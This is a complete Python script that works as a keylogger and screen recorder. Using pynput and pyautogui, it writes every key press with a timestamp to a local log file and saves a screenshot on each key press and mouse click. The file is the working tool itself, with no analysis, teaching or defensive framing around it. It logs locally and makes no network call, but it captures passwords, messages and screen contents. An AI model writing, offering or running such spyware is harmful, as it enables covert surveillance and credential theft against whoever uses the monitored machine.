import os
import time
from pynput import keyboard, mouse
import pyautogui

# Directory to save logs and screenshots
LOG_DIR = "activity_logs"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# Log file for key presses
LOG_FILE = os.path.join(LOG_DIR, "key_log.txt")

# Function to take a screenshot
def take_screenshot():
    screenshot = pyautogui.screenshot()
    timestamp = time.strftime("%Y%m%d-%H%M%S")
    screenshot.save(os.path.join(LOG_DIR, f"screenshot_{timestamp}.png"))
    print("Screenshot taken")

# Function to log keyboard inputs
def on_key_press(key):
    take_screenshot()
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - Key pressed: {key.char}\n")
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - Special key pressed: {key}\n")

# Function to log mouse clicks
def on_click(x, y, button, pressed):
    if pressed:
        take_screenshot()

# Set up listeners
keyboard_listener = keyboard.Listener(on_press=on_key_press)
mouse_listener = mouse.Listener(on_click=on_click)

keyboard_listener.start()
mouse_listener.start()

keyboard_listener.join()
mouse_listener.join()
